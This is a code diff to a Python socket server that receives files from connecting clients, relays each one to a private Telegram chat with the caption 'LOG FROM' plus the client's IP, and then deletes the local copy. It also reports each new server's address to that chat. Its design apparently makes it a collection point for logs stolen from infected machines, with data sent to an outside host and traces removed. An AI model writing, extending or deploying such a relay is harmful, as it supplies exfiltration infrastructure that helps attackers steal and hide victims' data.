@@ -1,5 +1,4 @@
-import socket, tqdm, telebot
-import os
+import socket, tqdm, telebot, os
 from _thread import *
 from requests import get
 
@@ -27,7 +26,7 @@ bot.send_message(chat_id=MYID,text=f"[#INITIALIZED_NEW_SERVER]\n\n{host}:{port}"
 print(f"SERVER READY\nListening on: {host}:{port}\n\nReady to work..")
 ServerSideSocket.listen(5)
 
-def multi_threaded_client(connection):
+def multi_threaded_client(connection, address):
    try:
       received = connection.recv(BUFFER_SIZE)
       print(str(received))
@@ -43,12 +42,14 @@ def multi_threaded_client(connection):
             f.write(bytes_read)
             progress.update(len(bytes_read))
       f1 = open(filename,"rb")
-      bot.send_document(MYID, f1,caption=filename)
+      bot.send_document(MYID, f1,caption=f"LOG FROM {address[0]}")
+      f1.close()
       connection.close()
+      os.unlink(f1.name)
    except Exception as e:
       print(f"ERROR: {e}")
 
 while True:
     Client, address = ServerSideSocket.accept()
-    start_new_thread(multi_threaded_client, (Client, ))
+    start_new_thread(multi_threaded_client, (Client, address, ))
 ServerSideSocket.close()
